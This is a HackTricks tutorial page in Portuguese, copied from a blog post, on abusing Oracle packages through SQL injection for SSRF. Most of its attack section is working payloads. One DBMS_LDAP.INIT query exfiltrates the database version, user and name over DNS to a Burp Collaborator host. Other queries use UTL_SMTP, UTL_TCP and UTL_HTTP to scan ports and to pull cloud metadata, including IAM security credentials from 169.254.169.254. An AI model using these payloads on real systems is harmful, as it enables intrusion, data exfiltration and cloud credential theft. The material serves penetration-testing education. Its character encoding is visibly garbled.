# Oracle injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Sirva este post uma c√≥pia da m√°quina do tempo do post exclu√≠do de [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

Usar o Oracle para fazer requisi√ß√µes HTTP e DNS fora de banda est√° bem documentado, mas como um meio de exfiltrar dados SQL em inje√ß√µes. Sempre podemos modificar essas t√©cnicas/fun√ß√µes para fazer outros SSRF/XSPA.

Instalar o Oracle pode ser realmente doloroso, especialmente se voc√™ quiser configurar uma inst√¢ncia r√°pida para testar comandos. Meu amigo e colega da [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me apontou para [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) que me permitiu configurar uma inst√¢ncia em uma m√°quina Ubuntu t2.large da AWS e Docker.

Eu executei o comando docker com a flag `--network="host"` para que eu pudesse imitar o Oracle como uma instala√ß√£o nativa com acesso total √† rede, durante o curso deste post no blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Pacotes Oracle que suportam uma especifica√ß√£o de URL ou de Nome de Host/N√∫mero da Porta <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Para encontrar pacotes e fun√ß√µes que suportam uma especifica√ß√£o de host e porta, fiz uma pesquisa no Google na [Documenta√ß√£o Online do Oracle Database](https://docs.oracle.com/database/121/index.html). Especificamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
A pesquisa retornou os seguintes resultados (nem todos podem ser usados para realizar rede externa)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Essa pesquisa rudimentar obviamente ignora pacotes como `DBMS_LDAP` (que permite passar um nome de host e n√∫mero de porta) como [a p√°gina de documenta√ß√£o](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplesmente aponta para um [local diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Portanto, pode haver outros pacotes Oracle que podem ser explorados para fazer solicita√ß√µes externas que eu possa ter perdido.

De qualquer forma, vamos dar uma olhada em alguns dos pacotes que descobrimos e listamos acima.

**DBMS\_LDAP.INIT**

O pacote `DBMS_LDAP` permite o acesso a dados de servidores LDAP. A fun√ß√£o `init()` inicializa uma sess√£o com um servidor LDAP e aceita um nome de host e n√∫mero de porta como argumento.

Essa fun√ß√£o j√° foi documentada anteriormente para mostrar a exfiltra√ß√£o de dados via DNS, como abaixo
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
No entanto, dado que a fun√ß√£o aceita um nome de host e um n√∫mero de porta como argumentos, voc√™ pode us√°-la para funcionar como um scanner de portas tamb√©m.

Aqui est√£o alguns exemplos
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` mostra que a porta est√° fechada enquanto um valor de sess√£o aponta para a porta estando aberta.

**UTL\_SMTP**

O pacote `UTL_SMTP` √© projetado para enviar e-mails via SMTP. O exemplo fornecido no [site de documenta√ß√£o da Oracle mostra como voc√™ pode usar este pacote para enviar um e-mail](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). Para n√≥s, no entanto, o interessante √© a capacidade de fornecer uma especifica√ß√£o de host e porta.

Um exemplo simples √© mostrado abaixo com a fun√ß√£o `UTL_SMTP.OPEN_CONNECTION`, com um tempo limite de 2 segundos.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Um `ORA-29276: transfer timeout` mostra que a porta est√° aberta, mas nenhuma conex√£o SMTP foi estabelecida, enquanto um `ORA-29278: SMTP transient error: 421 Service not available` mostra que a porta est√° fechada.

**UTL\_TCP**

O pacote `UTL_TCP` e seus procedimentos e fun√ß√µes permitem [comunica√ß√£o baseada em TCP/IP com servi√ßos](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Se programado para um servi√ßo espec√≠fico, este pacote pode facilmente se tornar uma porta de entrada na rede ou realizar solicita√ß√µes completas do lado do servidor, pois todos os aspectos de uma conex√£o TCP/IP podem ser controlados.

O exemplo [no site de documenta√ß√£o da Oracle mostra como voc√™ pode usar este pacote para fazer uma conex√£o TCP bruta para buscar uma p√°gina da web](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Podemos simplific√°-lo um pouco mais e us√°-lo para fazer solicita√ß√µes √† inst√¢ncia de metadados, por exemplo, ou a um servi√ßo TCP/IP arbitr√°rio.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Interessantemente, devido √† capacidade de criar solicita√ß√µes TCP brutas, este pacote tamb√©m pode ser usado para consultar o servi√ßo de meta-dados da Inst√¢ncia de todos os provedores de nuvem, uma vez que o tipo de m√©todo e os cabe√ßalhos adicionais podem ser todos passados dentro da solicita√ß√£o TCP.

**UTL\_HTTP e Solicita√ß√µes Web**

Talvez a t√©cnica mais comum e amplamente documentada em todos os tutoriais de Inje√ß√£o SQL Oracle Out of Band seja o [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). Este pacote √© definido pela documenta√ß√£o como - `O pacote UTL_HTTP faz chamadas do Protocolo de Transfer√™ncia de Hipertexto (HTTP) a partir de SQL e PL/SQL. Voc√™ pode us√°-lo para acessar dados na Internet via HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
Voc√™ poderia, adicionalmente, usar isso para realizar uma varredura de portas rudimentar tamb√©m com consultas como
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Um `ORA-12541: TNS:no listener` ou um `TNS:operation timed out` √© um sinal de que a porta TCP est√° fechada, enquanto um `ORA-29263: HTTP protocol error` ou dados s√£o um sinal de que a porta est√° aberta.

Outro pacote que usei no passado com sucesso variado √© o [`GETCLOB()` m√©todo do tipo abstrato `HTTPURITYPE` do Oracle](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) que permite interagir com uma URL e fornece suporte para o protocolo HTTP. O m√©todo `GETCLOB()` √© usado para buscar a resposta GET de uma URL como um [tipo de dado CLOB.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
